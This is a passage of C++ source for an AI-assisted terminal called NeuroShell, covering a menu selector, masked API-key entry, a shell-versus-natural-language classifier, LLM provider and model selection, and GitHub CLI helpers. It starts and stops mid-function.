            } else if (ev.code == KeyCode::Printable) {
                query.push_back(ev.ch);
                selectedIdx = 0;
            }
        }
    }

    // ═══════════════════════════════════════════════════════
    // In-Place Arrow-Key Menu Selector for Slash Commands
    // ═══════════════════════════════════════════════════════

    int SelectMenu(const std::string& title, const std::vector<MenuItem>& items, int initialSelection = 0) {
        int count = (int)items.size();
        if (count <= 0) return -1;

        int selected = std::clamp(initialSelection, 0, count - 1);
        bool firstRender = true;

        std::cout << "\033[?25l";

        while (true) {
            if (!firstRender) {
                std::cout << "\033[" << (count + 3) << "A\r";
            }
            firstRender = false;

            std::cout << C_CYAN << "  ╭── " << C_BOLD << C_WHITE << title << C_RESET << C_CYAN << " " 
                      << RepeatGlyph("─", std::max(0, 52 - (int)title.length())) << "╮\033[K\n";

            for (int i = 0; i < count; ++i) {
                std::string num = "[" + std::to_string(i + 1) + "]";
                if (i == selected) {
                    std::cout << C_CYAN << "  │ " << C_BOLD << C_GREEN << " ❯ " << num << " " << items[i].label << C_RESET 
                              << C_MUTED << " • " << items[i].desc << C_CYAN << "\033[K\n";
                } else {
                    std::cout << C_CYAN << "  │   " << C_DIM << C_WHITE << num << " " << items[i].label << C_RESET 
                              << C_MUTED << " • " << items[i].desc << C_CYAN << "\033[K\n";
                }
            }

            std::cout << C_CYAN << "  ╰────────────────────────────────────────────────────────╯\033[K\n";
            std::cout << C_MUTED << "  (Use ↑/↓ arrows or 1-" << count << " to choose, Enter to confirm, Esc to cancel)\033[K" << C_RESET << "\n";

            KeyEvent ev = terminal.ReadKey();
            if (ev.code == KeyCode::Up) {
                selected = (selected - 1 + count) % count;
            } else if (ev.code == KeyCode::Down) {
                selected = (selected + 1) % count;
            } else if (ev.code == KeyCode::Enter) {
                break;
            } else if (ev.code == KeyCode::Escape || ev.code == KeyCode::Ctrl_C) {
                selected = -1;
                break;
            } else if (ev.code == KeyCode::Printable && ev.ch >= '1' && ev.ch < ('1' + count)) {
                selected = ev.ch - '1';
                break;
            }
        }

        std::cout << "\033[?25h\n";
        return selected;
    }

    std::string PromptMasked(const std::string& promptText) {
        std::cout << C_CYAN << "  🔑 " << C_BOLD << C_WHITE << promptText << C_RESET << ": ";
        std::string secret = "";

        while (true) {
            KeyEvent ev = terminal.ReadKey();
            if (ev.code == KeyCode::Enter) {
                std::cout << "\n";
                break;
            } else if (ev.code == KeyCode::Escape || ev.code == KeyCode::Ctrl_C) {
                std::cout << C_MUTED << " [Cancelled]\n" << C_RESET;
                return "";
            } else if (ev.code == KeyCode::Backspace) {
                if (!secret.empty()) {
                    secret.pop_back();
                    std::cout << "\b \b" << std::flush;
                }
            } else if (ev.code == KeyCode::Printable) {
                secret.push_back(ev.ch);
                std::cout << C_MAGENTA << "•" << C_RESET << std::flush;
            }
        }
        return secret;
    }

    // ═══════════════════════════════════════════════════════
    // Natural Language & Shell Query Discriminator
    // ═══════════════════════════════════════════════════════

    static bool IsBinaryOnPathOrCwd(const std::string& name) {
        if (name.empty()) return false;
        static const std::unordered_set<std::string> nlWords = {
            "show", "open", "run", "find", "check", "tell", "list",
            "download", "push", "pull", "compile", "make", "create", "delete",
            "remove", "kill", "how", "what", "where", "why", "who", "please",
            "help", "explain", "inspect", "analyze", "scan", "view", "display",
            "give", "fetch", "clone", "compress", "extract", "test", "write",
            "set", "get", "put", "post", "search", "browse", "navigate"
        };
        if (nlWords.count(name)) return false;

        std::error_code ec;
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        if (fs::exists(name, ec) || fs::exists(name + ".exe", ec) ||
            fs::exists(name + ".cmd", ec) || fs::exists(name + ".bat", ec)) {
            return true;
        }
        const char* pathEnv = getenv("PATH");
        if (pathEnv) {
            std::stringstream ss(pathEnv);
            std::string item;
            while (std::getline(ss, item, ';')) {
                if (item.empty()) continue;
                fs::path p(item);
                if (fs::exists(p / (name + ".exe"), ec) || fs::exists(p / (name + ".cmd"), ec) ||
                    fs::exists(p / (name + ".bat"), ec) || fs::exists(p / name, ec)) {
                    return true;
                }
            }
        }
#else
        if (fs::exists(name, ec) || fs::exists("./" + name, ec)) return true;
        const char* pathEnv = getenv("PATH");
        if (pathEnv) {
            std::stringstream ss(pathEnv);
            std::string item;
            while (std::getline(ss, item, ':')) {
                if (item.empty()) continue;
                fs::path p(item);
                if (fs::exists(p / name, ec)) return true;
            }
        }
#endif
        return false;
    }

    static bool IsExplicitShellCommand(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        size_t s = lower.find_first_not_of(" \t\r\n");
        if (s == std::string::npos) return false;
        lower = lower.substr(s);

        // 1. Single token with no spaces: commands like "cmd_that_does_not_exist_123", "ls", "dir", "cls", "pwd"
        if (lower.find(' ') == std::string::npos && lower.find('\t') == std::string::npos) {
            return true;
        }

        // 1.5. Explicit "start" command handling (Windows internal built-in)
        if (lower.rfind("start ", 0) == 0) {
            std::string rest = lower.substr(6);
            size_t rs = rest.find_first_not_of(" \t");
            if (rs != std::string::npos) rest = rest.substr(rs);
            // Quotes "", flags /, URLs http://, https://, protocol handlers
            if (rest.rfind("\"\"", 0) == 0 || rest.rfind("\"", 0) == 0 ||
                rest.rfind("/", 0) == 0 || rest.rfind("http://", 0) == 0 ||
                rest.rfind("https://", 0) == 0 || rest.rfind("ms-", 0) == 0) {
                return true;
            }
            std::istringstream restIss(rest);
            std::string targetApp;
            restIss >> targetApp;
            if (IsBinaryOnPathOrCwd(targetApp)) {
                return true;
            }
        }

        // 2. PowerShell cmdlets (Verb-Noun) e.g., Get-Process, Set-Item, Invoke-WebRequest, etc.
        const std::vector<std::string> psVerbs = {
            "get-", "set-", "invoke-", "test-", "start-", "stop-", "restart-",
            "new-", "remove-", "compress-", "expand-", "select-", "where-", "format-",
            "out-", "convertto-", "convertfrom-", "enable-", "disable-", "install-", "update-",
            "write-", "clear-", "add-", "copy-", "move-", "rename-", "resolve-", "split-"
        };
        for (const auto& verb : psVerbs) {
            if (lower.rfind(verb, 0) == 0 || lower.find(" " + verb) != std::string::npos || lower.find("| " + verb) != std::string::npos) {
                return true;
            }
        }

        // 3. Shell pipes, redirection, chaining, or PowerShell variables
        if (lower.find('|') != std::string::npos ||
            lower.find(';') != std::string::npos ||
            lower.find('>') != std::string::npos ||
            lower.find('<') != std::string::npos ||
            lower.find("&&") != std::string::npos ||
            lower.find("||") != std::string::npos ||
            lower.find("$_") != std::string::npos ||
            (lower.size() > 1 && lower[0] == '$') ||
            (lower.size() > 1 && lower[0] == '(')) {
            return true;
        }

        // 4. Commands with CLI flags: contains " --", " -", or " /"
        if (lower.find(" --") != std::string::npos ||
            lower.find(" -") != std::string::npos ||
            lower.find(" /") != std::string::npos) {
            return true;
        }

        std::istringstream iss(lower);
        std::string firstWord;
        iss >> firstWord;

        // 4.5. Built-in shell commands (CMD, PowerShell, and POSIX)
        static const std::unordered_set<std::string> shellBuiltins = {
            "start", "dir", "echo", "type", "cls", "cd", "chdir", "copy", "move", "ren",
            "rename", "del", "erase", "md", "mkdir", "rd", "rmdir", "explorer", "whoami",
            "where", "attrib", "tasklist", "taskkill", "netstat", "ipconfig", "systeminfo",
            "findstr", "tree", "chcp", "color", "title", "pause", "path", "set", "setx",
            "assoc", "ftype", "ver", "vol", "robocopy", "reg", "sc", "wmic", "gh", "winget",
            "ls", "cat", "grep", "pwd", "rm", "cp", "mv", "touch", "chmod", "chown",
            "export", "source", "kill", "ps", "top", "df", "du", "head", "tail", "less",
            "more", "which", "xdg-open", "clear", "env", "uptime", "date"
        };
        if (shellBuiltins.count(firstWord)) {
            static const std::unordered_set<std::string> nlSecondWords = {
                "the", "a", "an", "my", "mine", "our", "your", "this", "all"
            };
            std::string secondWord;
            iss >> secondWord;
            if (!secondWord.empty() && nlSecondWords.count(secondWord)) {
                // E.g. "show the files" or "open my profile" vs "echo the message"
                if (firstWord != "echo" && firstWord != "start" && firstWord != "explorer") {
                    return false;
                }
            }
            return true;
        }

        // 5. Common developer and system CLI tools
        const std::vector<std::string> tools = {
            "git", "docker", "kubectl", "npm", "pnpm", "yarn", "pip", "python", "python3",
            "node", "cargo", "rustc", "go", "gcc", "g++", "clang", "make", "cmake", "ctest",
            "curl", "wget", "tar", "zip", "unzip", "ssh", "scp", "rsync", "ffmpeg",
            "powershell", "pwsh", "cmd", "bash", "zsh", "sh", "java", "javac", "php", "ruby",
            "pytest", "npx", "bun", "deno", "dotnet", "mvn", "gradle", "flutter", "gh", "winget",
            "brew", "apt", "apt-get", "dnf", "pacman"
        };
        for (const auto& t : tools) {
            if (firstWord == t) return true;
        }

        // 6. Binary or script dynamically verified on PATH or in current directory
        if (IsBinaryOnPathOrCwd(firstWord)) {
            return true;
        }

        return false;
    }

    static bool IsNaturalLanguageQuery(const std::string& input) {
        if (IsExplicitShellCommand(input)) return false;

        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        size_t s = lower.find_first_not_of(" \t\r\n");
        if (s == std::string::npos) return false;
        lower = lower.substr(s);

        // Explicit AI directives
        if (lower.rfind("@ai ", 0) == 0 || lower.rfind("@agent ", 0) == 0 || lower[0] == '?') {
            return true;
        }

        // Tokenize words
        std::istringstream iss(lower);
        std::string firstWord;
        iss >> firstWord;
        std::string word;
        int wordCount = 1;
        while (iss >> word) wordCount++;

        // Any non-shell input with 2 or more words is dynamic natural language for the AI model
        return (wordCount >= 2);
    }

    std::string TranslateNaturalLanguage(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        size_t first = lower.find_first_not_of(" \t\r\n");
        if (first == std::string::npos) return "";
        size_t last = lower.find_last_not_of(" \t\r\n");
        lower = lower.substr(first, last - first + 1);

        // Query Python Intelligence IPC Daemon (Dynamically powered by AI model)
        if (!ipcClient.EnsureConnected()) {
            NeuroShell::Daemon::DaemonManager::EnsureDaemonRunningSync(ipcClient, 20);
        }

        NeuroShell::IPC::TranslationResult trans = ipcClient.Translate(input, fs::current_path().string());
        if (trans.success && !trans.command.empty() && trans.command != input) {
            return trans.command;
        }

        return "";
    }

    void HandleSlashApiKey() {
        std::vector<MenuItem> providers = {
            {"NATIVE", "Native On-Device AI (EmbeddingGemma 2 - 100% Offline Default)", "native"},
            {"GROQ", "Ultra-Fast Cloud Inference", "groq"},
            {"OPENAI", "GPT-4o, GPT-4o-mini", "openai"},
            {"ANTHROPIC", "Claude 3.5 Sonnet", "anthropic"},
            {"GEMINI", "Google DeepMind 1.5 Flash / Pro", "gemini"},
            {"OPENROUTER", "100+ Models Multi-Provider Gateway", "openrouter"},
            {"OLLAMA", "Local Private SLM (Air-Gapped / Offline)", "ollama"}
        };

        int curIdx = 0;
        for (int i = 0; i < (int)providers.size(); ++i) {
            if (providers[i].id == activeProvider) {
                curIdx = i;
                break;
            }
        }

        std::cout << "\n";
        int choice = SelectMenu("Select LLM Provider", providers, curIdx);
        if (choice < 0) return;

        MenuItem selected = providers[choice];
        std::string defaultModel = "embeddinggemma-2-270m";
        if (selected.id == "groq") defaultModel = "llama-3.3-70b-versatile";
        if (selected.id == "openai") defaultModel = "gpt-4o-mini";
        if (selected.id == "anthropic") defaultModel = "claude-3-5-sonnet-20241022";
        if (selected.id == "gemini") defaultModel = "gemini-1.5-flash";
        if (selected.id == "openrouter") defaultModel = "meta-llama/llama-3.3-70b-instruct";
        if (selected.id == "ollama") defaultModel = "phi3:mini";

        if (selected.id == "native") {
            SaveConfig("native", "embeddinggemma-2-270m");
            std::cout << "  " << C_GREEN << "✅ Provider set to Native On-Device AI (100% Offline & Private). Zero API keys required!" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Default Model: embeddinggemma-2-270m" << C_RESET << "\n\n";
            return;
        }

        if (selected.id == "ollama") {
            SaveConfig("ollama", defaultModel);
            std::cout << "  " << C_GREEN << "✅ Provider set to Ollama (Air-Gapped / Offline SLM). No API key needed!" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Default Model: " << defaultModel << C_RESET << "\n\n";
            return;
        }

        std::string key = PromptMasked("Enter " + selected.label + " API Key");
        if (key.empty()) {
            std::cout << "  " << C_YELLOW << "⚠️ No key entered. Provider not updated." << C_RESET << "\n\n";
            return;
        }

        SaveConfig(selected.id, defaultModel, key);
        std::cout << "  " << C_GREEN << "✅ Successfully configured " << selected.label << "!" << C_RESET << "\n";
        std::cout << "  " << C_MUTED << "Encrypted & Saved to ~/.neuroshell/config.toml" << C_RESET << "\n";
        std::cout << "  " << C_MUTED << "Default Model: " << defaultModel << C_RESET << "\n\n";
    }

    void HandleSlashModel() {
        std::vector<MenuItem> models = {
            {"embeddinggemma-2-270m", "Native On-Device EmbeddingGemma 2 (Default)", "embeddinggemma-2-270m"},
            {"llama-3.3-70b-versatile", "Groq Cloud • Ultra Fast", "llama-3.3-70b-versatile"},
            {"gpt-4o-mini", "OpenAI • Efficient & Smart", "gpt-4o-mini"},
            {"claude-3-5-sonnet-20241022", "Anthropic • Best Coding Agent", "claude-3-5-sonnet-20241022"},
            {"gemini-1.5-flash", "Google • 1M Context Window", "gemini-1.5-flash"},
            {"phi3:mini", "Ollama Local • Air-Gapped SLM", "phi3:mini"}
        };

        int curIdx = 0;
        for (int i = 0; i < (int)models.size(); ++i) {
            if (models[i].id == activeModel) {
                curIdx = i;
                break;
            }
        }

        std::cout << "\n";
        int choice = SelectMenu("Select Active AI Model", models, curIdx);
        if (choice < 0) return;

        MenuItem selected = models[choice];
        SaveConfig(activeProvider, selected.id);
        std::cout << "  " << C_GREEN << "✅ Active Model switched to: " << C_BOLD << C_WHITE << selected.id << C_RESET << "\n\n";
    }

    void HandleSlashTheme() {
        std::vector<MenuItem> themes = {
            {"Cyberpunk Neon", "Cyan Prompt • Magenta Accents (Default)", "cyberpunk"},
            {"Matrix Emerald", "Green Glow • High Contrast Black", "matrix"},
            {"Dracula Night", "Purple / Pink • Dark Slate", "dracula"},
            {"Monokai Pro", "Amber Yellow • Vibrant Magenta", "monokai"},
            {"Nord Frost", "Ice Blue • Arctic Snow", "nord"}
        };

        std::cout << "\n";
        int choice = SelectMenu("Select Terminal Theme", themes, 0);
        if (choice < 0) return;

        activeTheme = themes[choice].label;
        std::cout << "  " << C_GREEN << "🎨 Theme changed to: " << C_BOLD << C_WHITE << activeTheme << C_RESET << "\n\n";
    }

    struct RepoEntry {
        std::string name;
        bool isPrivate = false;
        std::string updated;
        std::string desc;
    };

    static inline std::vector<RepoEntry> g_cached_repos;

    std::string ResolveRepoTarget(const std::string& input) {
        std::string clean = input;
        while (!clean.empty() && (clean.front() == ' ' || clean.front() == '\t')) clean.erase(clean.begin());
        while (!clean.empty() && (clean.back() == ' ' || clean.back() == '\t')) clean.pop_back();
        if (clean.empty()) return "";

        // 1. Is numeric index? (e.g. "1", "23")
        bool isNumeric = true;
        for (char c : clean) {
            if (!isdigit(c)) { isNumeric = false; break; }
        }
        if (isNumeric && !g_cached_repos.empty()) {
            try {
                int idx = std::stoi(clean);
                if (idx >= 1 && idx <= (int)g_cached_repos.size()) {
                    return g_cached_repos[idx - 1].name;
                }
            } catch (...) {}
        }

        // 2. Is full GitHub URL?
        if (clean.find("github.com/") != std::string::npos) {
            size_t p = clean.find("github.com/");
            std::string sub = clean.substr(p + 11);
            if (sub.size() >= 4 && sub.rfind(".git") == sub.size() - 4) sub = sub.substr(0, sub.size() - 4);
            return sub;
        }

        // 3. Is substring match in cached repos?
        if (!g_cached_repos.empty()) {
            std::string lowerClean = clean;
            std::transform(lowerClean.begin(), lowerClean.end(), lowerClean.begin(), ::tolower);
            for (const auto& r : g_cached_repos) {
                std::string lowerR = r.name;
                std::transform(lowerR.begin(), lowerR.end(), lowerR.begin(), ::tolower);
                if (lowerR.find(lowerClean) != std::string::npos) {
                    return r.name;
                }
            }
        }

        return clean;
    }

    void HandleReposCommand(const std::string& userOrOrg = "") {
        if (userOrOrg.empty()) {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 Fetching Your GitHub Repositories..." << C_RESET << "\n\n";
        } else {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 Fetching Public Repositories for '" << userOrOrg << "'..." << C_RESET << "\n\n";
        }

        // Injection-proof: validate identifier, then argv-vector exec (no shell).
        if (!userOrOrg.empty() && !neuroshell::safe_exec::IsValidGitHubUser(userOrOrg)) {
            std::cout << "  " << C_RED << "❌ Invalid GitHub user/org name: '" << userOrOrg << "'" << C_RESET << "\n\n";
            return;
        }
        std::vector<std::string> ghArgv = {"gh", "repo", "list"};
        if (!userOrOrg.empty()) ghArgv.push_back(userOrOrg);
        ghArgv.push_back("--limit");
        ghArgv.push_back("30");
        ghArgv.push_back("--json");
        ghArgv.push_back("nameWithOwner,isPrivate,isFork,updatedAt,description");

        auto ghRes = neuroshell::safe_exec::RunCapture(ghArgv);
        if (!ghRes.spawned) {
            std::cout << "  " << C_RED << "❌ GitHub CLI (gh) not found on this device." << C_RESET << "\n";
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
            std::cout << "  " << C_YELLOW << "Install command: " << C_WHITE << "winget install --id GitHub.cli" << C_RESET << "\n";
#elif defined(__APPLE__)
            std::cout << "  " << C_YELLOW << "Install command: " << C_WHITE << "brew install gh" << C_RESET << "\n";
#else
            std::cout << "  " << C_YELLOW << "Install command: " << C_WHITE << "sudo apt install gh" << C_RESET << "\n";
#endif
            std::cout << "  " << C_CYAN << "Tip: Type '/gh install' to install automatically." << C_RESET << "\n\n";
            return;
        }
        std::string jsonStr = ghRes.output;

        if (jsonStr.empty() || jsonStr.find("[") == std::string::npos || jsonStr == "[]") {
            std::cout << "  " << C_MUTED << "No repositories found or not authenticated. Run 'gh auth login' to connect." << C_RESET << "\n\n";
            return;
        }

        g_cached_repos.clear();
        size_t pos = 0;
        while ((pos = jsonStr.find("{", pos)) != std::string::npos) {
            size_t endObj = jsonStr.find("}", pos);
            if (endObj == std::string::npos) break;
            std::string obj = jsonStr.substr(pos, endObj - pos + 1);
            pos = endObj + 1;

            RepoEntry r;
            size_t namePos = obj.find("\"nameWithOwner\":\"");
            if (namePos != std::string::npos) {
                size_t nameEnd = obj.find("\"", namePos + 17);
                if (nameEnd != std::string::npos) r.name = obj.substr(namePos + 17, nameEnd - namePos - 17);
            }
            if (r.name.empty()) continue;

            size_t privPos = obj.find("\"isPrivate\":");
            if (privPos != std::string::npos) {
                r.isPrivate = (obj.substr(privPos + 12, 4) == "true");
            }

            size_t upPos = obj.find("\"updatedAt\":\"");
            if (upPos != std::string::npos) {
                size_t upEnd = obj.find("\"", upPos + 13);
                if (upEnd != std::string::npos) {
                    std::string fullUp = obj.substr(upPos + 13, upEnd - upPos - 13);
                    if (fullUp.size() >= 10) r.updated = fullUp.substr(0, 10);
                    else r.updated = fullUp;
                }
            }

            size_t descPos = obj.find("\"description\":\"");
            if (descPos != std::string::npos) {
                size_t descEnd = obj.find("\"", descPos + 15);
                if (descEnd != std::string::npos) {
                    r.desc = obj.substr(descPos + 15, descEnd - descPos - 15);
                    for (char& c : r.desc) {
                        if (c == '\r' || c == '\n' || c == '\t') c = ' ';
                    }
                }
            }
            if (r.desc.empty()) r.desc = "-";

            g_cached_repos.push_back(r);
        }

        if (g_cached_repos.empty()) {
            std::cout << "  " << C_MUTED << "No repositories found." << C_RESET << "\n\n";
            return;
        }

        // Dynamic Terminal Width Detection
        int termWidth = 100;
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        CONSOLE_SCREEN_BUFFER_INFO csbi;
        if (GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi)) {
            termWidth = csbi.srWindow.Right - csbi.srWindow.Left + 1;
        }
#elif defined(TIOCGWINSZ)
        struct winsize ws;
        if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) == 0 && ws.ws_col > 0) {
            termWidth = ws.ws_col;
        }
#endif
        termWidth = (std::max)(75, (std::min)(160, termWidth));

        size_t idxColW = 4;
        size_t nameColW = 32;
        size_t visColW = 10;
        size_t upColW = 10;
        // Borders and paddings: 2 margin + 6 borders + 5*2 paddings = 18
        size_t fixedOverhead = 2 + 6 + 10 + idxColW + nameColW + visColW + upColW;
        size_t descColW = (termWidth > (int)fixedOverhead) ? (size_t)(termWidth - fixedOverhead) : 20;

        auto makeUHoriz = [](size_t len) {
            std::string s = "";
            for (size_t i = 0; i < len + 2; ++i) s += "─";
            return s;
        };

        // Draw Mathematically Perfect Aligned Box Table
        std::cout << "  " << C_CYAN << "╭" << makeUHoriz(idxColW) << "┬" << makeUHoriz(nameColW) << "┬" << makeUHoriz(visColW) << "┬" << makeUHoriz(upColW) << "┬" << makeUHoriz(descColW) << "╮" << C_RESET << "\n";

        std::string hIdx = " #"; while (hIdx.size() < idxColW) hIdx += " ";
        std::string hName = "REPOSITORY"; while (hName.size() < nameColW) hName += " ";
        std::string hVis = "VISIBILITY"; while (hVis.size() < visColW) hVis += " ";
        std::string hUp = "UPDATED"; while (hUp.size() < upColW) hUp += " ";
        std::string hDesc = "DESCRIPTION"; while (hDesc.size() < descColW) hDesc += " ";

        std::cout << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << hIdx << C_RESET << C_CYAN << "│ " << C_BOLD << C_WHITE << hName << C_RESET << C_CYAN << "│ " << C_BOLD << C_WHITE << hVis << C_RESET << C_CYAN << "│ " << C_BOLD << C_WHITE << hUp << C_RESET << C_CYAN << "│ " << C_BOLD << C_WHITE << hDesc << C_RESET << C_CYAN << "│" << C_RESET << "\n";
        std::cout << "  " << C_CYAN << "├" << makeUHoriz(idxColW) << "┼" << makeUHoriz(nameColW) << "┼" << makeUHoriz(visColW) << "┼" << makeUHoriz(upColW) << "┼" << makeUHoriz(descColW) << "┤" << C_RESET << "\n";

        for (size_t i = 0; i < g_cached_repos.size(); ++i) {
            const auto& r = g_cached_repos[i];
            char idxBuf[24];
            snprintf(idxBuf, sizeof(idxBuf), "%2zu", i + 1);
            std::string idxStr = idxBuf;
            while (idxStr.size() < idxColW) idxStr += " ";

            std::string namePad = r.name;
            if (namePad.size() > nameColW) namePad = namePad.substr(0, nameColW - 3) + "...";
            while (namePad.size() < nameColW) namePad += " ";

            std::string visStr = r.isPrivate ? "private" : "public";
            while (visStr.size() < visColW) visStr += " ";
            std::string visColor = r.isPrivate ? (std::string(C_MAGENTA) + visStr + C_RESET) : (std::string(C_GREEN) + visStr + C_RESET);

            std::string upPad = r.updated;
            if (upPad.size() > upColW) upPad = upPad.substr(0, upColW);
            while (upPad.size() < upColW) upPad += " ";

            std::string descPad = r.desc;
            if (descPad.size() > descColW) descPad = descPad.substr(0, descColW - 3) + "...";
            while (descPad.size() < descColW) descPad += " ";

            std::cout << "  " << C_CYAN << "│" << C_RESET << " " << C_MUTED << idxStr << C_RESET << C_CYAN << "│" << C_RESET << " " << C_BOLD << C_WHITE << namePad << C_RESET << " " << C_CYAN << "│" << C_RESET << " " << visColor << " " << C_CYAN << "│" << C_RESET << " " << C_MUTED << upPad << C_RESET << " " << C_CYAN << "│" << C_RESET << " " << C_WHITE << descPad << C_RESET << " " << C_CYAN << "│" << C_RESET << "\n";
        }

        std::cout << "  " << C_CYAN << "╰" << makeUHoriz(idxColW) << "┴" << makeUHoriz(nameColW) << "┴" << makeUHoriz(visColW) << "┴" << makeUHoriz(upColW) << "┴" << makeUHoriz(descColW) << "╯" << C_RESET << "\n";
        std::cout << "  " << C_MUTED << "Total Repositories: " << C_BOLD << C_WHITE << g_cached_repos.size() << C_RESET << C_MUTED << "  • Type " << C_YELLOW << "read <#>" << C_RESET << C_MUTED << ", " << C_YELLOW << "audit <#>" << C_RESET << C_MUTED << ", " << C_YELLOW << "tree <#>" << C_RESET << C_MUTED << ", or " << C_YELLOW << "clone <#>" << C_RESET << "\n\n";
    }

    void HandleGitHubCommand(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        size_t s = lower.find_first_not_of(" \t");
        if (s != std::string::npos) lower = lower.substr(s);

        std::string sub = "";
        if (lower.rfind("/gh", 0) == 0) sub = lower.substr(3);
        else if (lower.rfind("/github", 0) == 0) sub = lower.substr(7);
        else if (lower.rfind("gh", 0) == 0) sub = lower.substr(2);
        size_t subS = sub.find_first_not_of(" \t");
        if (subS != std::string::npos) sub = sub.substr(subS);

        if (sub.empty() || sub == "status") {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 GitHub CLI Status & Connectivity" << C_RESET << "\n\n";
            auto verRes = neuroshell::safe_exec::RunCapture({"gh", "--version"});
            if (!verRes.spawned) {
                std::cout << "  " << C_RED << "❌ GitHub CLI (gh) is not installed on this device." << C_RESET << "\n\n";
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
                std::cout << "  " << C_YELLOW << "Install command: " << C_WHITE << "winget install --id GitHub.cli" << C_RESET << "\n";
#elif defined(__APPLE__)
                std::cout << "  " << C_YELLOW << "Install command: " << C_WHITE << "brew install gh" << C_RESET << "\n";
#else
                std::cout << "  " << C_YELLOW << "Install command: " << C_WHITE << "sudo apt install gh" << C_RESET << "\n";
#endif
                std::cout << "  " << C_CYAN << "Tip: Type '/gh install' to install automatically." << C_RESET << "\n\n";
                return;
            }
            std::string verLine = verRes.output.substr(0, verRes.output.find('\n'));
            std::cout << "  " << C_GREEN << "✔ " << verLine << C_RESET << "\n\n";

            std::cout << "  " << C_MUTED << "Checking authentication..." << C_RESET << "\n";
            auto authRes = neuroshell::safe_exec::RunCapture({"gh", "auth", "status", "-h", "github.com"});
            if (authRes.exit_code == 0) {
                std::cout << "  " << C_GREEN << "✔ Authenticated with GitHub" << C_RESET << "\n";
                auto userRes = neuroshell::safe_exec::RunCapture({"gh", "api", "user", "--jq", "{login: .login, html_url: .html_url, name: .name}"});
                if (userRes.exit_code == 0 && !userRes.output.empty()) {
                    std::cout << "  " << C_WHITE << userRes.output << C_RESET << "\n";
                }
            } else {
                std::cout << "  " << C_YELLOW << "⚠ Not authenticated. Run 'gh auth login' or '/gh login' to connect your account." << C_RESET << "\n";
            }
            std::cout << "\n";
            return;
        }

        if (sub == "install") {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 Installing GitHub CLI..." << C_RESET << "\n\n";
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
            std::string instCmd = "winget install --id GitHub.cli --accept-source-agreements --accept-package-agreements";
#elif defined(__APPLE__)
            std::string instCmd = "brew install gh";
#else
            std::string instCmd = "sudo apt update && sudo apt install -y gh";
#endif
            std::cout << "  " << C_MUTED << "Executing: " << instCmd << C_RESET << "\n\n";
            PlatformProcessRunner::Execute(instCmd);
            std::cout << "\n  " << C_GREEN << "✔ Installation process complete. Type '/gh status' to verify." << C_RESET << "\n\n";
            return;
        }

        if (sub == "login") {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 Connecting GitHub Account..." << C_RESET << "\n\n";
            PlatformProcessRunner::Execute("gh auth login");
            return;
        }

        if (sub == "repos" || sub == "repo") {
            HandleReposCommand("");
            return;
        }

        if (sub == "prs" || sub == "pr") {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 Fetching Open Pull Requests..." << C_RESET << "\n\n";
            PlatformProcessRunner::Execute("gh pr list");
            return;
        }

        if (sub == "issues" || sub == "issue") {
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 Fetching Open Issues..." << C_RESET << "\n\n";
            PlatformProcessRunner::Execute("gh issue list");
            return;
        }

        if (sub == "profile") {
            auto userRes = neuroshell::safe_exec::RunCapture({"gh", "api", "user", "--jq", ".html_url"});
            std::string url = "https://github.com";
            if (userRes.exit_code == 0 && !userRes.output.empty()) {
                size_t nl = userRes.output.find_first_of("\r\n");
                url = userRes.output.substr(0, nl != std::string::npos ? nl : userRes.output.size());
            }
            std::cout << "\n  " << C_BOLD << C_CYAN << "🐙 Opening GitHub Profile: " << url << C_RESET << "\n\n";
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
            PlatformProcessRunner::Execute("start \"\" \"" + url + "\"");
#elif defined(__APPLE__)
            PlatformProcessRunner::Execute("open \"" + url + "\"");
#else
            PlatformProcessRunner::Execute("xdg-open \"" + url + "\"");
#endif
            return;
        }

        PlatformProcessRunner::Execute("gh " + sub);
    }

    static std::string GetPythonBinary() {
        fs::path root = PlatformFS::GetNeuroShellRoot();
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        fs::path rootVenv = root / ".venv" / "Scripts" / "python.exe";
        if (fs::exists(rootVenv)) {
            return "\"" + rootVenv.string() + "\"";
        }
        if (fs::exists(".venv\\Scripts\\python.exe")) {
            return "\"" + fs::absolute(".venv\\Scripts\\python.exe").string() + "\"";
        }
        if (fs::exists("..\\.venv\\Scripts\\python.exe")) {
            return "\"" + fs::absolute("..\\.venv\\Scripts\\python.exe").string() + "\"";
        }
        return "python";
#else
        fs::path rootVenv = root / ".venv" / "bin" / "python";
        if (fs::exists(rootVenv)) {
            return "\"" + rootVenv.string() + "\"";
        }
        if (fs::exists(".venv/bin/python")) {
            return "\"" + fs::absolute(".venv/bin/python").string() + "\"";
        }
        if (fs::exists("../.venv/bin/python")) {
            return "\"" + fs::absolute("../.venv/bin/python").string() + "\"";
        }
        return "python3";
#endif
    }

    void HandleDownloadCommand(const std::string& input) {
        std::string args = input;
        size_t sp = args.find(' ');
        if (sp != std::string::npos) {
            args = args.substr(sp + 1);
        } else {
            args = "";
        }
        size_t firstChar = args.find_first_not_of(" \t");
        if (firstChar != std::string::npos) args = args.substr(firstChar);
        else args = "";

        if (args.empty()) {
            std::cout << "\n  " << C_BOLD << C_CYAN << "⬇ NeuroShell Universal Downloader" << C_RESET << "\n\n";
            std::cout << "  " << C_YELLOW << "Usage: /download <url|repo|app> [destination]" << C_RESET << "\n";
